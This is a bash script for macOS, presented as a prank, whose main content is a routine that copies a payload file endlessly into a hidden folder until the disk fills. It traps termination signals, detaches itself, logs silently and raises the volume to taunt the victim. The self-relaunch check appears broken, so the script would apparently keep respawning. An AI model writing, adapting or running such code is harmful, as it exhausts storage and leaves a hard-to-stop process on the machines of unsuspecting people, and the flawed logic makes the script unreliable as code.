#!/bin/bash

# Karan's Ultimate Prank Script v3.3 - Bulletproof Out-of-Box Edition
# FIXED: Directory creation timing issue resolved

set -o pipefail

SCRIPT_NAME="🎭 Karan's Ultimate Ding Dong Prank"
VERSION="3.3.0"
HIDDEN_DIR="$HOME/Downloads/.Karan"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
BOLD='\033[1m'
BLINK='\033[5m'
BG_GREEN='\033[42m'
BG_YELLOW='\033[43m'
BG_RED='\033[41m'
WHITE='\033[1;37m'
NC='\033[0m'

# Funny messages
FUNNY_MESSAGES=(
    "🎪 Welcome to Karan's digital circus!"
    "🔥 Disk space is overrated anyway..."
    "💀 Your storage is about to meet its maker!"
    "🎭 Plot twist: I'm unstoppable!"
    "⚡ Faster than your regrets!"
    "🌪️ Creating digital chaos..."
    "🎯 Bullseye! Another file bites the dust!"
    "🚀 To infinity and beyond your storage!"
    "💎 Every copy is a precious gem!"
    "🔮 Predicting your future: No storage left!"
    "🎨 Painting your disk full!"
    "⚔️ In the battle of space vs files, files win!"
    "🎵 Can you hear the hard drive crying?"
    "🍕 Like pizza slices, but for your disk!"
    "🌟 Making your disk famous, one file at a time!"
    "🎪 Ladies and gentlemen, the greatest show on disk!"
    "⚡ Charging up your storage anxiety!"
    "🎭 This is my masterpiece!"
)

# FIXED: Directory creation FIRST, then logging
ensure_directory_first() {
    mkdir -p "$HIDDEN_DIR" 2>/dev/null || true
    chflags hidden "$HIDDEN_DIR" 2>/dev/null || true
    touch "$HIDDEN_DIR/.ultimate_prank_log" 2>/dev/null || true
}

# Safe print function - directory guaranteed to exist
print_colored() {
    local color="$1"
    local message="$2"
    echo -e "${color}${message}${NC}"
    echo "$(date): $message" >> "$HIDDEN_DIR/.ultimate_prank_log" 2>/dev/null || true
}

# Random funny message
print_funny() {
    local message=${FUNNY_MESSAGES[$RANDOM % ${#FUNNY_MESSAGES[@]}]}
    local colors=("$RED$BOLD" "$GREEN$BOLD" "$YELLOW$BOLD" "$BLUE$BOLD" "$PURPLE$BOLD" "$CYAN$BOLD")
    local color=${colors[$RANDOM % ${#colors[@]}]}
    print_colored "$color$BLINK" "$message"
}

# Validate system
check_system() {
    if [[ "$(uname)" != "Darwin" ]]; then
        echo "💀 ERROR: macOS required!"
        exit 1
    fi
    
    if [[ ! -f "$1" ]]; then
        echo "🔍 ERROR: Payload not found!"
        exit 1
    fi
}

# Audio without overlap
announce() {
    osascript -e "set volume output volume 85" 2>/dev/null || true
    say "$1" 2>/dev/null && wait
}

# Make unstoppable
make_unstoppable() {
    trap '' INT TERM HUP QUIT PIPE STOP TSTP TTIN TTOU USR1 USR2
    exec < /dev/null
    exec >> "$HIDDEN_DIR/.ultimate_prank_log" 2>&1
    setsid 2>/dev/null || true
}

# Lightning duplication
lightning_duplication() {
    local source_file="$HIDDEN_DIR/.ultimate_payload"
    local counter=0
    
    print_colored "$RED$BOLD$BLINK" "🚀 INITIATING LIGHT-SPEED DIGITAL WARFARE!"
    print_funny
    
    while cp "$source_file" "$HIDDEN_DIR/karan_ultimate_$(printf "%08d" $counter).jpg" 2>/dev/null; do
        counter=$((counter + 1))
        
        # Colorful chaos every 50 files
        if [[ $((counter % 50)) -eq 0 ]]; then
            print_funny
        fi
        
        # Progress every 200 files
        if [[ $((counter % 200)) -eq 0 ]]; then
            print_colored "$BG_GREEN$WHITE$BOLD" "💥 DESTRUCTION LEVEL: $counter files eliminated!"
        fi
        
        # Milestone celebrations
        case $counter in
            1000)
                print_colored "$BG_YELLOW$RED$BOLD$BLINK" "🎉 FIRST THOUSAND AT LIGHT SPEED!"
                announce "One thousand files down! You're in trouble!" &
                ;;
            5000)
                print_colored "$BG_RED$WHITE$BOLD$BLINK" "🔥 FIVE THOUSAND! UNSTOPPABLE!"
                announce "Five thousand files! Storage is screaming!" &
                ;;
            10000)
                print_colored "$PURPLE$BOLD$BLINK" "💎 TEN THOUSAND! LEGENDARY!"
                announce "Ten thousand files! Welcome to digital chaos!" &
                ;;
        esac
    done
    
    print_colored "$PURPLE$BOLD$BLINK" "🏆 ULTIMATE VICTORY! Created $counter files!"
    announce "Mission accomplished! Created $counter files at light speed!" &
}

# Main function
main() {
    local payload="$1"
    
    check_system "$payload"
    
    # No prompts - immediate execution
    print_colored "$PURPLE$BOLD$BLINK" "$SCRIPT_NAME v$VERSION"
    print_colored "$CYAN$BOLD" "⚡ Lightning speed mode activated!"
    
    cp "$payload" "$HIDDEN_DIR/.ultimate_payload"
    
    make_unstoppable
    
    announce "Ding dong! Welcome to Karan's ultimate digital prank!" &
    announce "Prepare for storage annihilation at light speed!" &
    
    lightning_duplication
}

# BULLETPROOF EXECUTION
if [[ "${1:-}" != "--detached" ]]; then
    # CRITICAL: Create directory BEFORE any other operations
    ensure_directory_first
    
    # Launch detached
    nohup "$0" "$1" --detached > /dev/null 2>&1 &
    disown
    
    print_colored "$GREEN$BOLD" "🚀 Ultimate Prank launched at light speed!"
    print_colored "$PURPLE$BOLD" "⚡ Unstoppable execution initiated!"
    exit 0
else
    # Directory already created, safe to execute
    shift
    main "$@"
fi
